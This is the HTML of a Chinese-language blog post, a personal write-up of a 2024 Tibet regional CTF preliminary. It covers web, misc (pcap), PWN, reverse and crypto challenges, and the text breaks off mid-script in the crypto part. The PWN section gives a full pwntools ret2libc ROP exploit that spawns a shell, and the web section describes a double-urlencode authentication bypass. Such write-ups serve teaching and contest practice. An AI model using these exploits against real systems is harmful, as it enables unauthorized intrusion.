@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="8AOkjVl4_iukPinKmdlm-v7nhMS1Bbq4njJrJzT7DNg">
+  <meta name="baidu-site-verification" content="codeva-8CKVzgdicx">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.paulownia.top","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":{"valine":{"order":-1}},"activeClass":"valine"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="2024年西藏自治区玄盾珠峰网络安全竞赛预赛wp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024玄盾珠峰预赛writeup">
+<meta property="og:url" content="https://blog.paulownia.top/2024/09/12/2024%E7%8E%84%E7%9B%BE%E7%8F%A0%E5%B3%B0%E9%A2%84%E8%B5%9Bwriteup/index.html">
+<meta property="og:site_name" content="红烧胖大海的博客">
+<meta property="og:description" content="2024年西藏自治区玄盾珠峰网络安全竞赛预赛wp">
+<meta property="og:locale">
+<meta property="og:image" content="https://blog.paulownia.top/.top//image-20240812182730961.png">
+<meta property="og:image" content="https://blog.paulownia.top/.top//image-20240819113533508.png">
+<meta property="og:image" content="https://blog.paulownia.top/.top//image-20240819110852251.png">
+<meta property="og:image" content="https://blog.paulownia.top/.top//image-20240819111201592.png">
+<meta property="og:image" content="https://blog.paulownia.top/.top//image-20240812183438266.png">
+<meta property="og:image" content="https://blog.paulownia.top/.top//image-20240812183631822.png">
+<meta property="og:image" content="https://blog.paulownia.top/.top//image-20240819111606389.png">
+<meta property="og:image" content="https://blog.paulownia.top/.top//image-20240819111739687.png">
+<meta property="og:image" content="https://blog.paulownia.top/.top//image-20240819111823287.png">
+<meta property="og:image" content="https://blog.paulownia.top/.top//image-20240812194122774.png">
+<meta property="og:image" content="https://blog.paulownia.top/.top//image-20240812194736985.png">
+<meta property="og:image" content="https://blog.paulownia.top/.top//image-20240819113142066.png">
+<meta property="og:image" content="https://blog.paulownia.top/.top//image-20240819113213115.png">
+<meta property="article:published_time" content="2024-09-12T08:13:20.000Z">
+<meta property="article:modified_time" content="2024-09-12T14:27:06.340Z">
+<meta property="article:author" content="Paulownia">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="西藏">
+<meta property="article:tag" content="玄盾珠峰">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.paulownia.top/.top//image-20240812182730961.png">
+
+<link rel="canonical" href="https://blog.paulownia.top/2024/09/12/2024%E7%8E%84%E7%9B%BE%E7%8F%A0%E5%B3%B0%E9%A2%84%E8%B5%9Bwriteup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh'
+  };
+</script>
+
+  <title>2024玄盾珠峰预赛writeup | 红烧胖大海的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">红烧胖大海的博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
+    <link itemprop="mainEntityOfPage" href="https://blog.paulownia.top/2024/09/12/2024%E7%8E%84%E7%9B%BE%E7%8F%A0%E5%B3%B0%E9%A2%84%E8%B5%9Bwriteup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Paulownia">
+      <meta itemprop="description" content="记录知识,分享内容">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="红烧胖大海的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2024玄盾珠峰预赛writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2024-09-12 16:13:20 / Modified: 22:27:06" itemprop="dateCreated datePublished" datetime="2024-09-12T16:13:20+08:00">2024-09-12</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF-s-WriteUp/" itemprop="url" rel="index"><span itemprop="name">CTF's WriteUp</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2024/09/12/2024%E7%8E%84%E7%9B%BE%E7%8F%A0%E5%B3%B0%E9%A2%84%E8%B5%9Bwriteup/" class="post-meta-item leancloud_visitors" data-flag-title="2024玄盾珠峰预赛writeup" title="Views">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2024/09/12/2024%E7%8E%84%E7%9B%BE%E7%8F%A0%E5%B3%B0%E9%A2%84%E8%B5%9Bwriteup/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2024/09/12/2024%E7%8E%84%E7%9B%BE%E7%8F%A0%E5%B3%B0%E9%A2%84%E8%B5%9Bwriteup/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+            <div class="post-description">2024年西藏自治区玄盾珠峰网络安全竞赛预赛wp</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>7月29号刚参加完自治区的职工技能竞赛，不到半个月，又是玄盾珠峰网络安全技能竞赛，两个赛事都是只有个人赛，赛后觉得，可能个人赛更容易操作吧。本次比赛之后，得知上次的CFS比赛中，主办方给最终的第一名后台加了分，emmm，熟悉的场景，只不过变成受害者了。</p>
+<p>因为是预赛，所以大家不太卷，不像最后的决赛，半个小时风云变幻，那是真刺激。参赛选手们，出去上一次厕所回来，名次就变化一次。比赛后半程，出题师傅都不见了，我们开玩笑地说，可能是去帮忙做题去了。</p>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="urlencode（done）"><a href="#urlencode（done）" class="headerlink" title="urlencode（done）"></a>urlencode（done）</h2><p>dirsearch扫描网站路径，发现了index.php.bak</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>===<span class="variable">$_GET</span>[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Flag: XXXXXXX &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Can you anthenticate to this website?</span><br></pre></td></tr></table></figure>
+
+<p>审计代码发现，通过urlencode两次即可绕过代码的判断（web服务器会对url进行一次解码，结合代码会进行一次urldecode，所以需要两次encode），只需要修改一个字符就行，比赛的时候慌张了，全修改了，导致抢答的时候手慢了。</p>
+<p><img src="/.top//image-20240812182730961.png" alt="image-20240812182730961"></p>
+<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>一道java的ssti，之前没接触过，比赛的时候以为还是python呢，在那各种试，比赛最后关头放出的提示才发现，不是python。。。</p>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="hellokity（done）"><a href="#hellokity（done）" class="headerlink" title="hellokity（done）"></a>hellokity（done）</h2><p>strings大法好</p>
+<p><img src="/.top//image-20240819113533508.png" alt="image-20240819113533508"></p>
+<h2 id="analyse（done）"><a href="#analyse（done）" class="headerlink" title="analyse（done）"></a>analyse（done）</h2><p>根据比赛快结束之前放出的提示，关注icmp、dns以及http的流量</p>
+<h3 id="icmp"><a href="#icmp" class="headerlink" title="icmp"></a>icmp</h3><p><img src="/.top//image-20240819110852251.png" alt="image-20240819110852251"></p>
+<p>观察可知，icmp的frame的长度和data长度存在出入，如果对frame的长度进行ascii转码，可以得到一串字符，对字符串base64解码，拿到flag的一部分</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line">system(<span class="string">&#x27;tshark -2 -r analyse.pcapng -Y &quot;icmp&amp;&amp;icmp.type==8&quot; -Tfields -e data.len &gt;icmp.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./icmp.txt&quot;</span>)<span class="keyword">as</span> f:</span><br><span class="line">    data = f.readlines()</span><br><span class="line">flag = b64decode(<span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(x)) <span class="keyword">for</span> x <span class="keyword">in</span> data]))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>b’flag{be742a9c-‘</p>
+</blockquote>
+<h3 id="dns"><a href="#dns" class="headerlink" title="dns"></a>dns</h3><p>观察dns的包，发现请求了带二进制的域名</p>
+<p><img src="/.top//image-20240819111201592.png" alt="image-20240819111201592"></p>
+<p>dns部分导出查询域名里包含二进制的部分整理后(需要去重)，写脚本还原，是一个二维码（其实把二进制放到vscode里，就能隐约开出来是个二维码）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -2 -r analyse.pcapng -Y &quot;dns&quot; -Tfields -e dns.qry.name &gt;dns.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.top//image-20240812183438266.png" alt="image-20240812183438266"></p>
+<p>边长50的一个二维码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./1.txt&quot;</span>,<span class="string">&#x27;r&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">    cipher = f.read()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(cipher))</span><br><span class="line"></span><br><span class="line">qr_heithg = <span class="number">50</span></span><br><span class="line">pic = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (qr_heithg, qr_heithg))</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(qr_heithg):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(qr_heithg):</span><br><span class="line">        <span class="keyword">if</span> cipher[i] ==<span class="string">&#x27;1&#x27;</span> :</span><br><span class="line">            pic.putpixel([x, y], (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(cipher[y+x])</span><br><span class="line">            pic.putpixel([x, y], (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">pic.save(<span class="string">&quot;qr.png&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>扫描二维码拿到一部分flag</p>
+<p><img src="/.top//image-20240812183631822.png" alt="image-20240812183631822"></p>
+<h3 id="http"><a href="#http" class="headerlink" title="http"></a>http</h3><p>观察http，发现请求了很多图片，实在没有思路，后来老师给出了提示，在序号等于500的http请求里，有一段非常短的图片</p>
+<p><img src="/.top//image-20240819111606389.png" alt="image-20240819111606389"></p>
+<p>对base64解码，拿到最后一段flag</p>
+<p><img src="/.top//image-20240819111739687.png" alt="image-20240819111739687"></p>
+<p>保存成文件，文本打开即可过滤掉中间的空字符</p>
+<p><img src="/.top//image-20240819111823287.png" alt="image-20240819111823287"></p>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="questionnaire-investigation-v2（done）"><a href="#questionnaire-investigation-v2（done）" class="headerlink" title="questionnaire_investigation_v2（done）"></a>questionnaire_investigation_v2（done）</h2><p>查看源码主函数</p>
+<p><img src="/.top//image-20240812194122774.png" alt="image-20240812194122774"></p>
+<p><img src="/.top//image-20240812194736985.png" alt="image-20240812194736985"></p>
+<p>backdoor函数虽然有system，但是参数并不是”&#x2F;bin&#x2F;sh”</p>
+<p>所以需要通过函数中的puts的plt和got泄露出puts的真实地址，通过真实地址减去libc中puts的地址，计算出基地址</p>
+<p>然后再通过libc文件，找到system函数和&#x2F;bin&#x2F;sh字符串的地址，通过计算出运行时的真实地址，再进行覆盖。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(</span><br><span class="line">    log_level=<span class="string">&quot;debug&quot;</span>,</span><br><span class="line">    binary=<span class="string">&quot;./questionnaire_investigation_v2&quot;</span>,</span><br><span class="line">    terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">)</span><br><span class="line">DEBUG = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    p = process()</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;10.237.35.217&quot;</span>, <span class="number">28093</span>)</span><br><span class="line">e = context.binary</span><br><span class="line"><span class="comment">#这个glibc是本地环境测试的，按理来说，需要给出glibc文件，或者自己通过puts泄露的真实地址查询到使用的哪个libc</span></span><br><span class="line">libc = ELF(</span><br><span class="line">    <span class="string">&quot;/home/paulownia/Tools/Pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="comment">#获取got和plt中puts的地址</span></span><br><span class="line">puts_plt_addr = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="comment">#函数静态的rdi返回地址</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400793</span></span><br><span class="line"><span class="comment">#因为漏洞函数system直接传入了参数，所以这里需要用main函数来作为漏洞函数</span></span><br><span class="line">vul_addr = e.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">log.success(<span class="string">f&quot;puts_plt_addr:<span class="subst">&#123;<span class="built_in">hex</span>(puts_plt_addr)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;puts_got_addr:<span class="subst">&#123;<span class="built_in">hex</span>(puts_got_addr)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;vul_addr:<span class="subst">&#123;<span class="built_in">hex</span>(vul_addr)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment">#首先通过构造rop链，泄露出puts函数在运行时的真实地址</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*(<span class="number">0x30</span>+<span class="number">8</span>) + p64(pop_rdi_ret) + p64(puts_got_addr) + \</span><br><span class="line">    p64(puts_plt_addr) + p64(vul_addr)</span><br><span class="line">p.sendlineafter(</span><br><span class="line">    <span class="string">&#x27;Can you explain your confusion during CTF learning?\n&#x27;</span>, payload)</span><br><span class="line"><span class="comment">#接收puts的真实地址</span></span><br><span class="line">puts_real_addr = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">f&quot;puts_real_addr:<span class="subst">&#123;<span class="built_in">hex</span>(puts_real_addr)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment">#计算基地址</span></span><br><span class="line">base_addr = puts_real_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">f&quot;base_addr:<span class="subst">&#123;<span class="built_in">hex</span>(base_addr)&#125;</span>&quot;</span>)</span><br><span class="line">system_addr = base_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = base_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">log.success(<span class="string">f&quot;system_addr:<span class="subst">&#123;<span class="built_in">hex</span>(system_addr)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;bin_sh_addr:<span class="subst">&#123;<span class="built_in">hex</span>(bin_sh_addr)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment">#如果需要栈对齐，则需要返回添加一个返回地址</span></span><br><span class="line">ret_addr = <span class="number">0x0000000000400506</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*(<span class="number">0x30</span>+<span class="number">8</span>) + p64(ret_addr)+p64(pop_rdi_ret) + \</span><br><span class="line">    p64(bin_sh_addr) + p64(system_addr) + p64(vul_addr)</span><br><span class="line">p.sendlineafter(</span><br><span class="line">    <span class="string">&quot;Can you explain your confusion during CTF learning?\n&quot;</span>, payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="ad（done）"><a href="#ad（done）" class="headerlink" title="ad（done）"></a>ad（done）</h2><p>apk文件解压之后，直接strings搜索一下，能发现密文</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings * | grep -P &quot;\w&#123;4&#125;\&#123;\w+&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.top//image-20240819113142066.png" alt="image-20240819113142066"></p>
+<p>直接rot13一下</p>
+<p><img src="/.top//image-20240819113213115.png" alt="image-20240819113213115"></p>
+<h2 id="Crazyencode"><a href="#Crazyencode" class="headerlink" title="Crazyencode"></a>Crazyencode</h2><p>一道安卓逆向，没解出来。</p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="翻转（done）"><a href="#翻转（done）" class="headerlink" title="翻转（done）"></a>翻转（done）</h2><p>rot13</p>
+<p>比赛的时候总觉的rot13是有坑的，在那写脚本，结果发现不对。。。。。</p>
+<h2 id="xor（done）"><a href="#xor（done）" class="headerlink" title="xor（done）"></a>xor（done）</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,p,q,e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N=p*q</span><br><span class="line">x=<span class="number">81616793159567136422389758585591940662857576283302867011800445277592420866836093507411736040996742950676922327919824777893118631113867500244368612517429678572193116622664051815861481500355863477109385340706136160893878015686817479333596425572252594901263332045777914789662665019123717287533930696370434650226</span></span><br><span class="line"><span class="keyword">assert</span> x==p^^q</span><br><span class="line"></span><br><span class="line">d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">key = RSA.construct((N,e,d,p,q))</span><br><span class="line"></span><br><span class="line">cipher = PKCS1_OAEP.new(key)</span><br><span class="line"></span><br><span class="line">ciphertext = cipher.encrypt(flag)</span><br><span class="line"></span><br><span class="line">f1=<span class="built_in">open</span>(<span class="string">&quot;flag.enc&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line">f1.write(ciphertext)</span><br><span class="line">f2=<span class="built_in">open</span>(<span class="string">&quot;public.pem&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line">f2.write(key.publickey().exportKey())</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>已知n，e（从public.pem中分离）</p>
+<p>题目给了p和q异或的结果，所以按理来说，需要运用数论和sage，求出p和q，但是github上有现成的脚本</p>
+<blockquote>
+<p><em><a target="_blank" rel="noopener" href="https://github.com/sliedes/xor_factor">https://github.com/sliedes/xor_factor</a></em></p>
+</blockquote>
+<p>通过脚本，利用已知n和p^q，直接可以求出p和q</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xor_factor.py n x</span><br></pre></td></tr></table></figure>
+
+<p>然后就是传统的rsa私钥解密了，需要注意的是，题目是使用的PKCS1_OAEP方式加密的，所以没办法通过简单的数学公式求出明文，需要将私钥按照OAEP的方式生成，再解密</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./public.pem&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pubkey = RSA.importKey(f.read())</span><br><span class="line"><span class="built_in">print</span>(pubkey.e,pubkey.n)</span><br><span class="line"></span><br><span class="line">n = pubkey.n</span><br><span class="line">e = pubkey.e</span><br><span class="line"><span class="comment"># https://github.com/sliedes/xor_factor</span></span><br><span class="line"><span class="comment"># 用xor_factor.py n x得出p和q</span></span><br><span class="line"></span><br><span class="line">p = <span 